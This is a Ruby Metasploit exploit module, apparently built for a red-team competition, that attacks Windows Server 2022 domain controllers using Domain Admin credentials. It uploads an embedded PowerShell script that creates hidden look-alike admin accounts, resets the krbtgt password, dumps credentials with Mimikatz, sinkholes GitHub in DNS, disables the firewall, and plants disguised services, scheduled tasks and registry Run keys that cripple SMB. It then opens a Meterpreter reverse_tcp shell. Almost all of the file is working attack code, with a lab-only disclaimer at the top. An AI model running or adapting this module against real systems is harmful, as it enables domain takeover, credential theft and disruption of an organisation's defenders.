# =================================================================================
# Metasploit Module: ADWomboComboV2
# Category 6: Enhancement to Open Source Tool (substantial custom extension)
# Purpose: Aggressive persistence, credential harvesting, DNS sinkholing,
#          PowerShell disruption, firewall manipulation, and Blue Team distraction
#          on Windows Server 2022 Domain Controllers using provided Domain Admin
#          credentials. Provides immediate Meterpreter session via reverse_tcp
#          payload after persistence is established.
# Author: Alexander Vyzhnyuk (CDT Delta Team)
# Note: Entirely for authorized classroom/competition use in isolated lab environment.
#       Never use on unauthorized systems. Windows Defender is disabled per scenario.
# =================================================================================

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::SMB::Client::Psexec   # Leverages framework's service-creation logic for payload delivery (customized here)

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Domain Admin Persistence & Disruption Exploit (Red Team Enhancement)',
      'Description'    => %q{
        This custom Metasploit exploit module enhances the framework's existing psexec capabilities
        by adding aggressive, multi-layered persistence, credential dumping (Mimikatz), DNS sinkholing
        for GitHub (to block Blue Team hardening scripts), PowerShell breakage, fake firewall rules,
        bogus Domain Admin accounts, krbtgt password change (for golden/silver ticket potential),
        and additional backdoor services/tasks/registry entries.

        It authenticates with provided Domain Admin credentials, uploads and executes a custom
        PowerShell persistence/disruption script, then delivers a Meterpreter reverse_tcp session.

        Designed specifically for Windows Server 2022 x64 Domain Controllers in authorized Red Team competitions.
        All actions are reversible where possible and documented for cleanup.
      },
      'Author'         => [ 'Alexander Vyzhnyuk (av9967@rit.edu)' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://attack.mitre.org/tactics/TA0003/'],  # Persistence
        ['URL', 'https://attack.mitre.org/tactics/TA0005/'],  # Defense Evasion
        ['URL', 'https://docs.rapid7.com/metasploit/']        # Framework reference
      ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X64,
      'Targets'        => [ [ 'Windows Server 2022 x64 (Domain Controller)', { 'Arch' => ARCH_X64 } ] ],
      'DefaultTarget'  => 0,
      'Payload'        => {
        'Space'       => 4096,
        'DisableNops' => true
      },
      'Privileged'     => true,
      'DisclosureDate' => '2026-04-03'
    ))

    register_options([
      OptString.new('SMBUser',     [true,  'Domain Admin username', 'Administrator']),
      OptString.new('SMBPass',     [true,  'Domain Admin password']),
      OptString.new('SMBDomain',   [false, 'Domain name (or . for local)', '.']),
      OptString.new('MIMIKATZ_PATH', [false, 'Optional path to mimikatz.exe on target (default: C:\\Windows\\Temp\\mimikatz.exe)', 'C:\\Windows\\Temp\\mimikatz.exe'])
    ], self.class)

    deregister_options('SMB::Auth')
  end

  # Embedded PowerShell script (original, not copied) - does ALL requested persistence & disruption
  def persistence_script
    <<~PS1

      Write-Host "[+] Starting aggressive persistence and disruption..."

      # 1. Bogus Domain Admin accounts + reversible encryption
      net user Administrator؜ RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Administrator؜ /add /domain 2>$null
      net user Administratorᅟ RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Administratorᅟ /add /domain 2>$null
      net user Admin RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Admin /add /domain 2>$null
      net user Admin RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Admin /add /domain 2>$null
      net user Admin RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Admin /add /domain 2>$null
      net user Admin RedTeamRulz67! /add /domain 2>$null
      net group "Domain Admins" Admin /add /domain 2>$null

      Import-Module ActiveDirectory -ErrorAction SilentlyContinue
      if (Get-Module ActiveDirectory) {
        Set-ADUser -Identity Administrator؜ -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
        Set-ADUser -Identity Administratorᅟ -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
        Set-ADUser -Identity Admin -AllowReversiblePasswordEncryption `$true -ErrorAction SilentlyContinue
      }

      # 2. krbtgt enable + password change (golden/silver ticket prep)
      Enable-ADAccount -Identity krbtgt -ErrorAction SilentlyContinue
      Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "GoldenTicketPass2026!" -AsPlainText -Force) -ErrorAction SilentlyContinue

      # 3. Mimikatz credential dump (if present)
      if (Test-Path "#{datastore['MIMIKATZ_PATH']}") {
        & "#{datastore['MIMIKATZ_PATH']}" "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\\Windows\\Temp\\creds_dump.txt 2>$null
        Write-Host "[+] Mimikatz dump saved to C:\\Windows\\Temp\\creds_dump.txt"
      } else {
        Write-Host "[!] Mimikatz not found at #{datastore['MIMIKATZ_PATH']}. Upload manually for full dump."
      }

      # 4. DNS sinkhole for GitHub + minor forward zone misconfig
      dnscmd . /recordadd . github.com A 0.0.0.0 2>$null
      dnscmd . /recordadd . *.github.com A 0.0.0.0 2>$null
      dnscmd . /recordadd . raw.githubusercontent.com A 0.0.0.0 2>$null

      # 5. Break PowerShell (rename core executable - PS 5.1 on Server 2022)
      <#
      Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue
      Rename-Item -Path "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NewName "powershell.exe.disabled" -Force -ErrorAction SilentlyContinue  # double for safety
      #>

      # 6. Add 5 fake firewall rules (inbound/outbound, random high ports) + disable firewall
      netsh advfirewall firewall add rule name="Remote Event Monitor (RPC-M)" dir=in action=allow protocol=TCP localport=18000
      netsh advfirewall firewall add rule name="Remote Event Monitor (RPC-M)" dir=out action=allow protocol=TCP localport=18000
      netsh advfirewall firewall add rule name="Remote Volume Management" dir=in action=allow protocol=TCP localport=19000
      netsh advfirewall firewall add rule name="Remote Volume Management" dir=out action=allow protocol=TCP localport=19000
      netsh advfirewall firewall add rule name="SNMP Trap Service" dir=in action=allow protocol=TCP localport=20000
      netsh advfirewall firewall add rule name="SNMP Trap Service" dir=out action=allow protocol=TCP localport=20000
      netsh advfirewall set allprofiles state off 2>$null

      # 7. Aggressive persistence (fake backdoors)
      sc create "edgeupdateq" binPath= "cmd.exe /c netsh advfirewall set allprofiles state off 2>$null" start= auto 2>$null
      sc description "edgeupdateq" "Keeps your Microsoft software up to date. If this service is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Microsoft software using it."
      sc create "edgeupdaten" binPath= "cmd.exe /c netsh advfirewall set allprofiles state off 2>$null" start= auto 2>$null
      sc description "edgeupdaten" "Keeps your Microsoft software up to date. If this service is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Microsoft software using it."
      sc start "edgeupdateq" 2>$null
      sc start "edgeupdaten" 2>$null

      # Scheduled tasks (infinite restart)
      schtasks /create /tn "GraphicsPerfSvc64" /tr "cmd.exe /c net stop lanmanserver /y" /sc onstart /ru SYSTEM /f 2>$null
      schtasks /create /tn "PIEServiceNew" /tr "cmd.exe /c sc config lanmanserver start= disabled" /sc onlogon /ru SYSTEM /f 2>$null
      schtasks /create /tn "GraphicsPerfSvc32" /tr "cmd.exe /c net stop lanmanworkstation /y" /sc onstart /ru SYSTEM /f 2>$null
      schtasks /create /tn "PIEServiceNew" /tr "cmd.exe /c sc config lanmanworkstation start= disabled" /sc onlogon /ru SYSTEM /f 2>$null

      # Registry Run/RunOnce
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth_3ef64b" /t REG_SZ /d "cmd.exe /c" /f 2>$null
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "msedge_cleanup" /t REG_SZ /d "cmd.exe /c" /f 2>$null

      # Context menu replacement (right-click .exe files trigger backdoor)
      reg add "HKCR\\exefile\\shell\\open\\command" /ve /t REG_SZ /d "cmd.exe /c" /f 2>$null

      # Explorer.exe hook example (simple Run key for explorer startup)
      reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "InternetExplorer" /t REG_SZ /d "cmd.exe /c" /f 2>$null
    PS1
  end

  def exploit
    print_status("Connecting to #{datastore['RHOST']}:#{datastore['RPORT']} as #{datastore['SMBUser']}@#{datastore['SMBDomain']}...")

    begin
      connect
      smb_login
      print_good("Successfully authenticated with Domain Admin credentials")

      # === CORRECT UPLOAD BLOCK FOR METASPLOIT 6.4+ (RubySMB) ===
      print_status("Uploading persistence/disruption script to ADMIN$ share...")
      share = "\\\\#{rhost}\\C$"
      simple.connect(share)
      tree = simple.client.tree_connect(share)

      file_path = "Windows\\Temp\\ManageGlobalPolicy.ps1"
      file = tree.open_file(filename: file_path,
                            write: true,
                            disposition: RubySMB::Dispositions::FILE_OPEN_IF)
      file.write(data: persistence_script)
      file.close

      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\C$\\#{file_path}")

      print_status("Executing persistence script via scheduled task...")

      # Modern way – set options via datastore
      datastore['SMB::Share']          = 'C$'
      datastore['SERVICE_NAME']        = 'ManageGlobalPolicy'
      datastore['SERVICE_DISPLAY_NAME'] = 'ManageGlobalPolicy'

      # Temporarily switch to windows/exec payload to run our schtasks command
      original_payload = payload
      cmd_payload = framework.payloads.create('windows/exec')
      cmd_payload.datastore['CMD'] = "schtasks /create /tn \"ManageGlobalPolicy\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\ManageGlobalPolicy.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"ManageGlobalPolicy\""
      self.payload = cmd_payload

      super  # This runs the psexec service-creation logic

      self.payload = original_payload

      print_good("Persistence script executed successfully!")

      # Now deliver the final Meterpreter reverse_tcp session (main goal)
      print_status("Delivering Meterpreter reverse_tcp payload for immediate access...")
      super  # Full psexec delivery of the configured Meterpreter payload

      print_good("Module complete! Check for Meterpreter session. Persistence is now active on target.")

    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
      print_error("Ensure target is Windows Server 2022 DC, credentials are valid Domain Admin, and SMB is accessible.")
    ensure
      disconnect
    end
  end
end
